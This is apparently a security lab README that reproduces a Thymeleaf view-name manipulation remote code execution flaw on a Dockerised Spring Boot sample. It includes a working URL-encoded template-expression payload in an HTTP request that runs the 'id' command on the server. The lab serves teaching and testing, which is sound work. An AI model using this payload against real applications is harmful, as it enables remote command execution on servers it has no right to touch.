# Thymeleaf View Name Manipulation Remote Code Execution

[中文版本(Chinese version)](README.zh-cn.md)

Thymeleaf is a server-side Java template engine commonly used with Spring MVC and Spring Boot applications.

When a Spring MVC controller returns a `String`, Spring treats that value as a view name unless the handler is annotated with `@ResponseBody` or uses a redirect view. Thymeleaf parses view names as fragment expressions before resolving the template. If untrusted input is concatenated into a returned view name or fragment selector, an attacker can inject a Thymeleaf preprocessing expression and execute arbitrary Java code. This issue affects applications that use Spring MVC with Thymeleaf and expose controller methods whose returned view names contain attacker-controlled data; the Veracode research sample demonstrates the pattern on Spring Boot 2.2.0.RELEASE with Thymeleaf 3.0.11.RELEASE.

References:

- <https://github.com/veracode-research/spring-view-manipulation/>
- <https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/>
- <https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#expression-preprocessing>

## Environment Setup

Execute the following command to start a Spring Boot 2.2.0 application using Thymeleaf:

```
docker compose up -d
```

After the server starts, visit `http://your-ip:8090` to see the sample Thymeleaf page.

## Vulnerability Reproduction

The `/path` endpoint returns `user/` plus the `lang` parameter plus `/welcome` as the view name. A normal request such as `http://your-ip:8090/path?lang=en` renders the template at `templates/user/en/welcome.html`.

Next, place a Thymeleaf preprocessing expression inside the `lang` parameter. The expression below executes the harmless `id` command and reads the first token from its output. Because the payload is embedded in the view name before Thymeleaf resolves the template, the expression is evaluated on the server:

```
GET /path?lang=__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7D__::.x HTTP/1.1
Host: your-ip:8090


```

The HTTP response contains a Thymeleaf template resolution error, but the evaluated `id` output appears inside the generated template name, proving that command execution happened on the target server.

![The response shows the evaluated id command output in the Thymeleaf template error](1.png)
